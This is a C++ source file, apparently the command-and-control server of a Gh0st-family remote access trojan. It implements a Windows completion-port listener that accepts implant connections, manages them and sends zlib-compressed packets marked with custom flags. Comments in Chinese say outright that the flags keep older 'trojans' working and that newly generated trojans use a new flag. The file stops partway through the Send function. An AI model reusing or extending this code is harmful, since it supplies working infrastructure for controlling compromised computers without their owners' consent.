// IOCPServer.cpp: implementation of the CIOCPServer class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "../TSPClientPublic.h"
#include "IOCPServer.h"
#include "../MainFrm.h"
#include "log.h"
#include "zlib.h"
#include "../resource.h"
#include "../SettingsView.h"
#include "../TSPClientView.h"
#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

extern CLog g_log;
extern CLog g_logErr;

// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	30 //13
#define	FLAG_SIZE	10  //	5
#define HUERISTIC_VALUE 2
CRITICAL_SECTION CIOCPServer::m_cs;

extern CSettingsView *g_pSettingView;
extern CTSPClientView* g_pConnectView;



#define  Key 0x2a

int BitManipulation( unsigned char* instr, int instrlen,unsigned char* outstr)
{
	for (int i=0;i<instrlen;i++)  //异或操作
	{
		{
			outstr[i]=instr[i]^Key;
		}

	}
	return 0;

}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	C'tor initializes Winsock2 and miscelleanous events etc.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////

CIOCPServer::CIOCPServer()
{
	TRACE("CIOCPServer=%p\n",this);	
	//char Name[MAX_PATH];
	//sprintf(Name,"ServerLock");
	//this->m_listlock.Init(Name);
	InitializeCriticalSection(&m_cs);

	m_hThread		= NULL;
	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);
	m_socListen		= NULL;

	m_bTimeToKill		= FALSE;
	m_bDisconnectAll	= FALSE;

	m_hEvent		= NULL;
	m_hCompletionPort= NULL;

	m_bInit = FALSE;
	m_nCurrentThreads	= 0;
	m_nBusyThreads		= 0;

	m_nSendKbps = 0;
	m_nRecvKbps = 0;

	m_nMaxConnections = 10000;
	m_nKeepLiveTime = 1000 * 30;//60 * 3; // 三分钟探测一次
	// Packet Flag;
	BYTE bPacketFlag[] = {'F', 'K', 'J', 'P', '3'};
	BYTE bPacketFlag2[] = {'F', 'U', 'C', 'K', '3'};
	BYTE bPacketFlag3[] = {'D', 'S', 'K', 'J', 'Y'};   //zhenyu 20140918  CFWW6不能使用了
	BYTE bPacketFlag4[] = {'C', 'F', 'W', 'W', '6'};   //zhenyu 20140925 照顾以前中的
	//BYTE bPacketFlag5[] = {'L', 'Y', 'S', 'B', 'D'};   //zhenyu 20140925 照顾以前中的'C', 'F', 'Y', 'T', 'T'
	//BYTE bPacketFlag5[] = {'D', 'Z', 'B','S', 'G', 'D'};   //zhenyu 20141112 照顾以前中的'C', 'F', 'Y', 'T', 'T'
	BYTE bPacketFlag5[] = {'A', 'B', 'C','D','E','U', 'V','W','X','Y'};   //zhenyu 20141112 照顾以前中的'C', 'F', 'Y', 'T', 'T'
    BYTE bPacketFlag6[] = {'2', '0', '1','5','0','7', '2','4','X','X'};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	memcpy(m_bPacketFlag2, bPacketFlag2, sizeof(bPacketFlag2));
	memcpy(m_bPacketFlag3, bPacketFlag3, sizeof(bPacketFlag3));
	memcpy(m_bPacketFlag4, bPacketFlag4, sizeof(bPacketFlag4));
	memcpy(m_bPacketFlag5, bPacketFlag5, sizeof(bPacketFlag5));
	memcpy(m_bPacketFlag6, bPacketFlag6, sizeof(bPacketFlag6));
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	Tidy up
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::~CIOCPServer()
{

		Shutdown();
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Init
// 
// DESCRIPTION:	Starts listener into motion
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;
	m_pFrame		=  pFrame;
	m_nMaxConnections = nMaxConnections;
	m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);


	if (m_socListen == INVALID_SOCKET)
	{
		TRACE(_T("Could not create listen socket %ld\n"),WSAGetLastError());
		return FALSE;
	}

	// Event for handling Network IO
	m_hEvent = WSACreateEvent();

	if (m_hEvent == WSA_INVALID_EVENT)
	{
		TRACE(_T("WSACreateEvent() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return FALSE;
	}

	// The listener is ONLY interested in FD_ACCEPT
	// That is when a client connects to or IP/Port
	// Request async notification
	int nRet = WSAEventSelect(m_socListen,
						  m_hEvent,
						  FD_ACCEPT);

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("WSAAsyncSelect() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return FALSE;
	}

	SOCKADDR_IN		saServer;		


	// Listen on our designated Port#
	saServer.sin_port = htons(nPort);

	// Fill in the rest of the address structure
	saServer.sin_family = AF_INET;
	saServer.sin_addr.s_addr = INADDR_ANY;

	// bind our name to the socket
	nRet = bind(m_socListen, 
				(LPSOCKADDR)&saServer, 
				sizeof(struct sockaddr));

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("bind() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return FALSE;
	}

	// Set the socket to listen
	LOG((LEVEL_INFO,"开始监听,端口=%d\n",nPort));
	nRet = listen(m_socListen, SOMAXCONN);
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("listen() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return FALSE;
	}


	////////////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////
	UINT	dwThreadId = 0;

	m_hThread =
			(HANDLE)_beginthreadex(NULL,				// Security
									 0,					// Stack size - use default
									 ListenThreadProc,  // Thread fn entry point
									 (void*) this,	    
									 0,					// Init flag
									 &dwThreadId);	// Thread address

	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();
		m_bInit = TRUE;
		return TRUE;
	}

	return FALSE;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ListenThreadProc
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)
{
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(lParam);

	WSANETWORKEVENTS events;
	
	while(1)
	{
		//
		// Wait for something to happen
		//
        if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
            break;

		DWORD dwRet;
		dwRet = WSAWaitForMultipleEvents(1,
									 &pThis->m_hEvent,
									 FALSE,
									 100,
									 FALSE);

		if (dwRet == WSA_WAIT_TIMEOUT)
			continue;

		//
		// Figure out what happened
		//
		int nRet = WSAEnumNetworkEvents(pThis->m_socListen,
								 pThis->m_hEvent,
								 &events);
		
		if (nRet == SOCKET_ERROR)
		{
			TRACE(_T("WSAEnumNetworkEvents error %ld\n"),WSAGetLastError());
			break;
		}

		// Handle Network events //
		// ACCEPT
		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
				pThis->OnAccept();
			else
			{
			//	OutputDebugStringA("ListenThreadProc");

				TRACE(_T("Unknown network event error %ld\n"),WSAGetLastError());
				break;
			}

		}

	} // while....

	return 0; // Normal Thread Exit Code...
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnAccept
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09072001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::OnAccept()
{

	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;
	
	int			nRet;
	int			nLen;

	//OutputDebugStringA("OnAccept");
	if (m_bTimeToKill || m_bDisconnectAll)
		return;

	//
	// accept the new socket descriptor
	//
	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_socListen,
					    (LPSOCKADDR)&SockAddr,
						&nLen); 

	LOG((LEVEL_INFO,"Accept new socket:%x \n",clientSocket ));

	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			//
			// Just log the error and return
			//
			TRACE(_T("accept() error\n"),WSAGetLastError());
			return;
		}
	}



	
	//在分配 内存 前先检查不用的连接

		m_listlock.WaitToRead();
		int listCount=m_listContexts.GetCount();
		m_listlock.Done();
		// add by zhenyu 2014-10-24
		if ( 0  !=  (IsBadReadPtr(g_pSettingView,strlen((char *) g_pSettingView))))
		{
			OutputDebugString("bad g_pSettingView");
			return;
		}
		// and end
		if(listCount>=g_pSettingView->m_MaxConnect)
		{
			m_listlock.WaitToRead();
			POSITION pos =m_listContexts.GetHeadPosition();
			m_listlock.Done();
		}
		if(listCount>=g_pSettingView->m_MaxConnect)
		{
			if(!CancelIo((HANDLE)clientSocket))
			{
			}
			closesocket(clientSocket);
			return;
		}

// 	ClientContext* FILEMANAGER_pContext = NULL;
	ClientContext* pContext=NULL;

// 	while (!m_listContexts.IsEmpty());

		if (!pContext)
		{
			pContext=AllocateContext();
		}


	if (pContext == NULL)
	{
		LOG((LEVEL_WARNNING,"\t Accept pContext==NULL\n"));
		if(!CancelIo((HANDLE)clientSocket))
		{
		}
		closesocket(clientSocket);
		return;
	}
	

	pContext->m_socketlock.WaitToWrite();

	pContext->m_Socket = clientSocket;
	memcpy(&pContext->m_saClient,&SockAddr,sizeof(SOCKADDR_IN));
	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);
	GetLocalTime(&pContext->m_lastAcceptTime);
	GetLocalTime(&pContext->m_lastRecvTime);
	memset(&pContext->m_lastCloseTime,0,sizeof(SYSTEMTIME));

	pContext->m_socketlock.Done();

   // Associate the new socket with a completion port.

	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD) pContext))
	{
		LOG((LEVEL_WARNNING,"\t AssociateSocketWithCompletionPort(handle=%x) error\n",m_hCompletionPort));

		delete pContext;
		pContext = NULL;

		closesocket( clientSocket );
		closesocket( m_socListen );
		return;
	}


	// 关闭nagle算法,以免影响性能，因为控制时控制端要发送很多数据量很小的数据包,要求马上发送
	// 暂不关闭，实验得知能网络整体性能有很大影响
	const char chOpt = 1;

// 	int nErr = setsockopt(pContext->m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
// 	if (nErr == -1)
// 	{
// 		TRACE(_T("setsockopt() error\n"),WSAGetLastError());
// 		return;
// 	}

	// Set KeepAlive 开启保活机制

	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) != 0)
	{
		TRACE(_T("setsockopt() error\n"), WSAGetLastError());
	}
	

	// 设置超时详细信息
	tcp_keepalive	klive;
	klive.onoff = 1; // 启用保活
	klive.keepalivetime = m_nKeepLiveTime;
	klive.keepaliveinterval = 1000 * 10; // 重试间隔为10秒 Resend if No-Reply
	DWORD lpcbBytesReturned=0;

		WSAIoctl
			(
			pContext->m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&lpcbBytesReturned,
			0,
			NULL
			);

	//CLock cs(m_cs, "OnAccept" );
	// Hold a reference to the context

	m_listlock.WaitToWrite();
	m_listContexts.AddTail(pContext);		
	LOG((LEVEL_INFO,"--------------建立连接pContext=%08x;m_Socket=%08x;Ip=%s(%d)\n",pContext,pContext->m_Socket,inet_ntoa(pContext->m_saClient.sin_addr),m_listContexts.GetCount()));
	m_listlock.Done();



	// Trigger first IO Completion Request
	// Otherwise the Worker thread will remain blocked waiting for GetQueuedCompletionStatus...
	// The first message that gets queued up is ClientIoInitializing - see ThreadPoolFunc and 
	// IO_MESSAGE_HANDLER


		OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);
		BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);


		if ( (!bSuccess && GetLastError( ) != ERROR_IO_PENDING))
		{
			LOG((LEVEL_ERROR,"Accept 发生错误，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket));
			RemoveStaleClient(pContext,TRUE,FALSE);
			return;
		}
		
		//m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_CLIENT_CONNECT);
		

		// Post to WSARecv Next
		PostRecv(pContext);
		LOG((LEVEL_INFO,"\t Accept end.\n"));
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::InitializeIOCP
// 
// DESCRIPTION:	Create a dummy socket and associate a completion port with it.
//				once completion port is create we can dicard the socket
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::InitializeIOCP(void)
{

    SOCKET s;
    DWORD i;
    UINT  nThreadID;
    SYSTEM_INFO systemInfo;

    //
    // First open a temporary socket that we will use to create the
    // completion port.  In NT 3.51 it will not be necessary to specify
    // the FileHandle parameter of CreateIoCompletionPort()--it will
    // be legal to specify FileHandle as NULL.  However, for NT 3.5
    // we need an overlapped file handle.
    //

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if ( s == INVALID_SOCKET ) 
        return FALSE;

    // Create the completion port that will be used by all the worker
    // threads.
    m_hCompletionPort = CreateIoCompletionPort( (HANDLE)s, NULL, 0, 0 );
    if ( m_hCompletionPort == NULL ) 
	{
        closesocket( s );
        return FALSE;
    }

    // Close the socket, we don't need it any longer.
    closesocket( s );

    // Determine how many processors are on the system.
    GetSystemInfo( &systemInfo );

	m_nThreadPoolMin  = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;
	m_nThreadPoolMax  = m_nThreadPoolMin;
	m_nCPULoThreshold = 10; 
	m_nCPUHiThreshold = 75; 

	m_cpu.Init();


    // We use two worker threads for eachprocessor on the system--this is choosen as a good balance
    // that ensures that there are a sufficient number of threads available to get useful work done 
	// but not too many that context switches consume significant overhead.
	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;

	// We need to save the Handles for Later Termination...
	
	m_nWorkerCnt = 0;
//nWorkerCnt
    for ( i = 0; i < 1; i++ ) 
	{
		m_hWorkerThread[i] = (HANDLE)_beginthreadex(NULL,					// Security
										0,						// Stack size - use default
										ThreadPoolFunc,     		// Thread fn entry point
										(void*) this,			// Param for thread
										0,						// Init flag
										&nThreadID);			// Thread address


        if (m_hWorkerThread[i] == NULL ) 
		{
            CloseHandle( m_hCompletionPort );
            return FALSE;
        }

		m_nWorkerCnt++;

//		CloseHandle(hWorker);
    }

	return TRUE;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ThreadPoolFunc 
// 
// DESCRIPTION:	This is the main worker routine for the worker threads.  
//				Worker threads wait on a completion port for I/O to complete.  
//				When it completes, the worker thread processes the I/O, then either pends 
//				new I/O or closes the client's connection.  When the service shuts 
//				down, other code closes the completion port which causes 
//				GetQueuedCompletionStatus() to wake up and the worker thread then 
//				exits.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001              Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{
	// Get back our pointer to the class

	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
	ASSERT(pThis);

    HANDLE hCompletionPort = pThis->m_hCompletionPort;
    
    DWORD dwIoSize;
    LPOVERLAPPED lpOverlapped;
    ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	bool			bEnterRead;
	if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
	{
//	::TerminateThread(GetCurrentThread(),0);
		return 0;
	}

	InterlockedIncrement(&pThis->m_nCurrentThreads);
	InterlockedIncrement(&pThis->m_nBusyThreads);

	//
    // Loop round and round servicing I/O completions.
	// 

	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == FALSE; ) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= FALSE;
		bEnterRead		= FALSE;
		// Thread is Block waiting for IO completion
		InterlockedDecrement(&pThis->m_nBusyThreads);


		// Get a completed IO request.
		BOOL bIORet = GetQueuedCompletionStatus(
               hCompletionPort,
               &dwIoSize,
               (LPDWORD) &lpClientContext,
               &lpOverlapped, INFINITE);

		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);


		if(lpClientContext)
		{
			lpClientContext->m_socketlock.WaitToWrite();
			GetLocalTime(&lpClientContext->m_lastRecvTime);
			lpClientContext->m_socketlock.Done();
		}

#ifdef  _MYDEBUG1

		LOG((LEVEL_INFO,"\t 完成端口bIORet=%08x；dwIOErr=%08x；lpClientContext=%08x\n",bIORet,dwIOError,lpClientContext));	

#endif

		if(lpClientContext)
		{
			
#ifdef  _MYDEBUG1

			LOG((LEVEL_INFO,"\t lpClientContext->m_socket=%08x\n",lpClientContext->m_Socket));

#endif


		}

		int nBusyThreads = InterlockedIncrement(&pThis->m_nBusyThreads);

        if (!bIORet && dwIOError != WAIT_TIMEOUT )
		{
			if (lpClientContext && (pThis->m_bTimeToKill == FALSE)&&(dwIoSize==0))
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE,TRUE);
			}
			continue;

			// anyway, this was an error and we should exit
			bError = TRUE;
		}
		
		if (!bError) 
		{
			
			// Allocate another thread to the thread Pool?
			if (nBusyThreads == pThis->m_nCurrentThreads)
			{
				if (nBusyThreads < pThis->m_nThreadPoolMax)
				{
					if (pThis->m_cpu.GetUsage() > pThis->m_nCPUHiThreshold)
					{
						UINT nThreadID = -1;

//						HANDLE hThread = (HANDLE)_beginthreadex(NULL,				// Security
//											 0,					// Stack size - use default
//											 ThreadPoolFunc,  // Thread fn entry point
///											 (void*) pThis,	    
//											 0,					// Init flag
//											 &nThreadID);	// Thread address

//						CloseHandle(hThread);
					}
				}
			}


			// Thread timed out - IDLE?
			if (!bIORet && dwIOError == WAIT_TIMEOUT)
			{
				if (lpClientContext == NULL)
				{
					if (pThis->m_cpu.GetUsage() < pThis->m_nCPULoThreshold)
					{
						// Thread has no outstanding IO - Server hasn't much to do so die
						if (pThis->m_nCurrentThreads > pThis->m_nThreadPoolMin)
							bStayInPool =  FALSE;
					}

					bError = TRUE;
				}
			}
		}
//////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////
		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				pThis->m_listlock.WaitToRead();
				POSITION pos=pThis->m_listContexts.Find(lpClientContext);
				pThis->m_listlock.Done();
				if(pos)
				{
					if((lpClientContext->m_Socket==0)||(lpClientContext->m_Socket==INVALID_SOCKET))
					{	
						g_log.Log(LEVEL_ERROR,"\t SOCKET Handle！！！\n");
						g_logErr.Log(LEVEL_ERROR,"\t SOCKET Handle！！！\n");
					}
					else
					{	
						try{
							pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);
						}
						catch (...) {
							g_log.Log(LEVEL_ERROR,"%s,%s()::%d=%08x 发现异常！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
							g_logErr.Log(LEVEL_ERROR,"%s,%s()::%d=%08x 发现异常！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
						}
					}
				}else
				{
					g_log.Log(LEVEL_WARNNING,"\t 接收数据的连接已经关闭，数据丢弃！%08x=%s\n",lpClientContext->m_Socket,inet_ntoa(lpClientContext->m_saClient.sin_addr));
				}
			}
		}

		if(pOverlapPlus)
			delete pOverlapPlus; // from previous call
    }

//	InterlockedDecrement(&pThis->m_nWorkerCnt);

	InterlockedDecrement(&pThis->m_nCurrentThreads);
	InterlockedDecrement(&pThis->m_nBusyThreads);
   	return 0;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Stop
// 
// DESCRIPTION:	Signal the listener to quit his thread
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Stop()
{
    ::SetEvent(m_hKillEvent);
	if(WaitForSingleObject(m_hThread, 3000)==WAIT_TIMEOUT)
	{
		::TerminateThread(m_hThread,0);
		if(WaitForSingleObject(m_hThread, 3000)==WAIT_TIMEOUT)
		{
			g_log.Log(0,"关闭侦听线程超时!\n");
		}
	}
	CloseHandle(m_hThread);
	m_hThread=NULL;
	g_log.Log(0,"关闭侦听线程!\n");
	for(int i=0;i<m_nWorkerCnt;i++)
	{
		if(WaitForSingleObject(m_hWorkerThread[i], 3000)==WAIT_TIMEOUT)
		{
			::TerminateThread(m_hWorkerThread[i],0);
			if(WaitForSingleObject(m_hWorkerThread[i], 3000)==WAIT_TIMEOUT)
			{
				g_log.Log(0,"关闭接收线程%d超时!\n",i);
			}
		}
		g_log.Log(0,"关闭接收线程%d!\n",i);
		CloseHandle(m_hWorkerThread[i]);
		m_hWorkerThread[i]=NULL;
	}

    CloseHandle(m_hKillEvent);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::GetHostName
// 
// DESCRIPTION:	Get the host name of the connect client
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CString CIOCPServer::GetHostName(SOCKET socket)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));

	int nSockAddrLen = sizeof(sockAddr);
	
	BOOL bResult = getpeername(socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	return bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CIOCPServer::PostRecv(ClientContext* pContext)
{
	// issue a read request 
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);
	ULONG			ulFlags = MSG_PARTIAL;
	DWORD			dwNumberOfBytesRecvd;
	if(pContext==NULL)
		return;
	if(pContext->m_Socket==INVALID_SOCKET)
	{
		g_log.Log(LEVEL_WARNNING,"PostRecv()连接已经关闭%s,%s()::%d=%08x WSARecv错误！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
		return;
	}
	UINT nreturn = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);
	
	if ( nreturn == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		if( WSAGetLastError()==0x2746)
		{
			g_log.Log(LEVEL_WARNNING,"%s,%s()::%d=%08x WSARecv错误！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
		}else
		{
			g_log.Log(LEVEL_ERROR,"%s,%s()::%d=%08x WSARecv错误！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
			g_logErr.Log(LEVEL_ERROR,"%s,%s()::%d=%08x WSARecv错误！！！\n",__FILE__,__FUNCTION__,__LINE__,GetLastError());
			g_log.Log(LEVEL_ERROR,"pContext(%08x,%08x)\n",pContext,pContext->m_Socket);
			g_logErr.Log(LEVEL_ERROR,"pContext(%08x,%08x)\n",pContext,pContext->m_Socket);
		}
	//	RemoveStaleClient(pContext, FALSE,FALSE);
	}
}
////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Send
// 
// DESCRIPTION:	Posts a Write + Data to IO CompletionPort for transfer
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
{

#ifdef _MYDEBUG1


	LOG((LEVEL_FUNC_IN_OUT,"Send Entering...(%08x,%08x)%08x\n",pContext,pContext->m_Socket,nSize));

#endif

	if (pContext == NULL)
		return;
	if(pContext->m_Socket==INVALID_SOCKET)
	{
		LOG((LEVEL_WARNNING,"\tSend()连接已经关闭,%s()::%08x WSARecv错误！！！\n",__FUNCTION__,GetLastError()));
		return;
	}

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		LPBYTE			pDest = new BYTE[destLen];
		if( !pDest )
		{
			LOG((LEVEL_ERROR,"\tMemory alloc(%d(%x)) error.",destLen,destLen));
			return;
		}

		int	nRet = compress(pDest, &destLen, lpData, nSize);
		
		if (nRet != Z_OK)
		{
			LOG((LEVEL_WARNNING,"\tcompress error\n"));
			delete [] pDest;
			return;
		}
		
		BYTE bPacketFlag[FLAG_SIZE];
		CopyMemory(bPacketFlag, pContext->m_byInBuffer, sizeof(bPacketFlag));
		int i_HDR_SIZE = 30;
		if (memcmp(m_bPacketFlag6, bPacketFlag, sizeof(m_bPacketFlag6)) == 0)
		{
			//如果是新的标示，则使用HDR_SIZE为18，否则为30，保持111上的老版本木马能用，以后生成的木马使用新标示，新版本木马
			//控制功能可用HDR_SIZE为18
			i_HDR_SIZE = 18;
		}

			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + i_HDR_SIZE;
			// 5 bytes packet flag
			if(!pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag)))
			{
				LOG((LEVEL_WARNNING,"\tWrite error\n"));
				delete [] pDest;
				return;
			}
			
			// 4 byte header [Size of Entire Packet]
			if(!pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen)))
			{
				LOG((LEVEL_WARNNING,"\tWrite error\n"));
				delete [] pDest;				
				return;
			}
			// 4 byte header [Size of UnCompress Entire Packet]
			if(!pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize)))
			{
				LOG((LEVEL_WARNNING,"\tWrite error\n"));
				delete [] pDest;				
				return;
			}
			// Write Data
			if(!pContext->m_WriteBuffer.Write(pDest, destLen))
			{
				LOG((LEVEL_WARNNING,"\tWrite error\n"));
				delete [] pDest;				
				return;
			}
			delete [] pDest;

#ifdef _MYDEBUG1

			LOG((LEVEL_INFO,"\t备份数据,size=%d(%x)\n",nSize,nSize));

#endif

			// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			
			pContext->m_ResendWriteBuffer.ClearBuffer();
			if(!pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize))
			{
				LOG((LEVEL_WARNNING,"ResendWriteBuffer.Write error\n"));
				return;
				// 备份发送的数据
			}
			delete [] lpResendWriteBuffer;			
		}
		else // 要求重发
		{
			LOG((LEVEL_INFO,"\tSend...重发\n"));			
			if(!pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag)))
			{
				LOG((LEVEL_WARNNING,"\t重发写buffer错\n"));
				return;
			}
		
//--------------------------
			pContext->m_ResendWriteBuffer.ClearBuffer();
			if(!pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag)))	// 备份发送的数据	
			{
				LOG((LEVEL_WARNNING,"\tResendWriteBuffer.Write error\n"));
				return;
			}
			
		}
	// Wait for Data Ready signal to become available


#ifdef _MYDEBUG1

	LOG((LEVEL_INFO,"\tBegin Wait\n"));

#endif

	WaitForSingleObject(pContext->m_hWriteComplete, 2000);

#ifdef _MYDEBUG1

	LOG((LEVEL_INFO,"\tWaitReturn\n"));

#endif

	// Prepare Packet
 //	pContext->m_wsaOutBuffer.buf = (CHAR*) new BYTE[nSize];
 //	pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();


#ifdef _MYDEBUG1

	LOG((LEVEL_INFO,"\tPostQueuedCompleteionStatus\n"));

#endif

	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
